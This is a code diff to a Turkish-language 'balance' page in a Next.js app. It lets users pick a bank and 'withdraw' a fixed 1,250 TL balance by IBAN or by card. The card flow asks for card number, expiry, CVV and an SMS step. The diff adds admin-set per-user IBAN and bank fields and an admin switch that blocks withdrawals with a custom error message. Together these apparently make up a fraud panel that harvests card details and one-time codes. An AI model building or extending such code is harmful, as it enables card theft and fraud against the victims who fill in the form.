@@ -1,7 +1,7 @@
 
 "use client";
 
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter, DialogTrigger } from "@/components/ui/dialog";
@@ -9,7 +9,8 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Loader2, Landmark } from "lucide-react";
-import { Separator } from "@/components/ui/separator";
+import { getMembers } from "@/lib/member-storage";
+import type { AdminMember } from "@/app/dashboard/admin/page";
 
 const banks = [
   "ZİRAAT BANK", "AKBANK", "VAKIF BANK", "GARANTİ BANK", "DENİZ BANK",
@@ -25,6 +26,7 @@ const InfoItem = ({ label, value, valueClassName }: { label: string; value: stri
 
 export default function BalancePage() {
   const { toast } = useToast();
+  const [currentUser, setCurrentUser] = useState<AdminMember | null>(null);
   const [selectedBank, setSelectedBank] = useState<string | null>(null);
   
   const [isOptionsDialogOpen, setOptionsDialogOpen] = useState(false);
@@ -40,6 +42,16 @@ export default function BalancePage() {
   const [expiryDate, setExpiryDate] = useState("");
   const [cvv, setCvv] = useState("");
   
+  useEffect(() => {
+    const loggedInUserData = localStorage.getItem('loggedInUser');
+    if (loggedInUserData) {
+        const loggedInUser = JSON.parse(loggedInUserData);
+        // We need to get the latest user data from the main source of truth
+        const allMembers = getMembers();
+        const freshUserData = allMembers.find(m => m.id === loggedInUser.id);
+        setCurrentUser(freshUserData || null);
+    }
+  }, []);
 
   const handleBankSelect = (bank: string) => {
     setSelectedBank(bank);
@@ -68,6 +80,17 @@ export default function BalancePage() {
   
   const handleCardSubmit = (e: React.FormEvent) => {
     e.preventDefault();
+
+    // Check transaction status first
+    if (currentUser?.transactionStatus === 'blocked') {
+        toast({
+            variant: "destructive",
+            title: "İşlem Engellendi",
+            description: currentUser.errorMessage || "Para çekme işleminiz geçici olarak engellenmiştir.",
+        });
+        return;
+    }
+
     if (!cardFormSubmitted) {
       setIsLoading(true);
       setCardFormSubmitted(true);
@@ -147,8 +170,8 @@ export default function BalancePage() {
         </CardHeader>
         <CardContent className="space-y-4 text-base">
           <InfoItem label="Mevcut Bakiye" value="1,250.00 TL" valueClassName="text-green-600 dark:text-green-500" />
-          <InfoItem label="IBAN Numarası" value="TR12 3456 7890 1234 5678 9012 34" />
-          <InfoItem label="Banka" value="VIP Bankası A.Ş." />
+          <InfoItem label="IBAN Numarası" value={currentUser?.iban || "TRXX XXXX XXXX XXXX XXXX XXXX XX"} />
+          <InfoItem label="Banka" value={currentUser?.bank || "Banka Bilgisi Yok"} />
         </CardContent>
       </Card>
 
@@ -162,7 +185,7 @@ export default function BalancePage() {
             <Button
               key={bank}
               variant="default"
-              className="h-24 break-words p-2 text-center text-base font-semibold"
+              className="h-24 break-words p-2 text-center text-base font-semibold bg-blue-900 hover:bg-blue-800"
               onClick={() => handleBankSelect(bank)}
             >
               {bank}
@@ -183,7 +206,7 @@ export default function BalancePage() {
               <div className="flex flex-col gap-4 py-4 sm:flex-row">
                   <Dialog open={isIbanDialogOpen} onOpenChange={setIbanDialogOpen}>
                       <DialogTrigger asChild>
-                          <Button className="w-full text-base sm:w-auto sm:flex-1">IBAN Numarası ile Çek</Button>
+                          <Button className="w-full text-base sm:w-auto sm:flex-1 bg-blue-600 hover:bg-blue-500">IBAN Numarası ile Çek</Button>
                       </DialogTrigger>
                       <DialogContent>
                           <DialogHeader>
@@ -207,7 +230,7 @@ export default function BalancePage() {
 
                   <Dialog open={isCardDialogOpen} onOpenChange={resetCardDialog}>
                       <DialogTrigger asChild>
-                          <Button className="w-full text-base sm:w-auto sm:flex-1">Kart ile Çek</Button>
+                          <Button className="w-full text-base sm:w-auto sm:flex-1 bg-blue-600 hover:bg-blue-500">Kart ile Çek</Button>
                       </DialogTrigger>
                       <DialogContent>
                           {!isSmsStep ? (
